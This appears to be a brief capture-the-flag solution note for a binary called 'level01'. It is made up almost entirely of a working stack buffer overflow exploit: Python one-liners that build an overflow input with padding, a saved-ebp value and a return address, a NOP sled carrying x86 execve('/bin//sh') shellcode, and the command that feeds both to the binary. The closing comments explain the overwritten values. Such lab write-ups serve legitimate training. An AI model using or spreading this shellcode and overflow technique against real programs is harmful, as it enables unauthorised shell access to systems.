decompile the binary 
    
exec bin
   
    
==========================================================================================

python -c 'print "dat_wil"; print " " * 76 + "\x00\x00\x00\x00" + "\xc9\xd8\xff\xff"' > input
python -c 'print "\x90" * 100 + "\x31\xC9\xF7\xE1\x51\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xB0\x0B\xCD\x80"' > shell_code
cat input - | ./level01 $(cat shell_code)

\x00\x00\x00\x00 -> ebp value in stack to not make the programe try to get the value from a bad address
\xc9\xd8\xff\xff -> shell code stack address